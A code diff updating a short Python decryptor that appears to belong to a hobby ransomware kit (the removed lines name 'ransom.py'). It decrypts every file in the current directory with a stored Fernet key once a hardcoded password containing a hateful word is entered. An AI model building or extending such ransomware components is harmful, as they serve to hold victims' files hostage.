@@ -1,38 +1,29 @@
-#also outdated, need an upgraded
-
 import os
 from cryptography.fernet import Fernet
+from getpass import getpass
 
-data_file = []
+files = [file for file in os.listdir() if (os.path.isfile(file) and file not in __file__ and file != "kk.txt")]
 
-for file in os.listdir() :
-	if file == "ransom.py" or file == "thekey.key" or file == "dekripsi.py":
-		continue
-	
+with open("kk.txt", 'rb') as k:
+    key = k.read()
 
-	if os.path.isfile(file) :
-		data_file.append(file)	
-	
+def decrypt(files, key):
+    p1 = "ideeplyhatemaggot"
+    p2 = getpass()
 
-with open("thekey.key", "rb") as key :
-	kunci_rahasia = key.read()
+    if p2 == p1:
 
-kata_rahasia = "hate"
-input = input("masukkan sandi : ")
+        for file in files:
+            with open(file, 'rb') as fl:
+                a = fl.read()
 
-if input == kata_rahasia :
-	for data in data_file :
-		with open(data, "rb") as thefile:
-			isi = thefile.read()
-		isi_dekripsi = Fernet(kunci_rahasia).decrypt(isi)
-	
-		with open(data, "wb") as thefile :
-			thefile.write(isi_dekripsi)
+            try:
+                aec = Fernet(key).decrypt(a)
+
+                with open(file, 'wb') as fl:
+                    fl.write(aec)
+            except:
+                pass
 
 
-
-else:
-	pass
-
-
-
+decrypt(files, key)
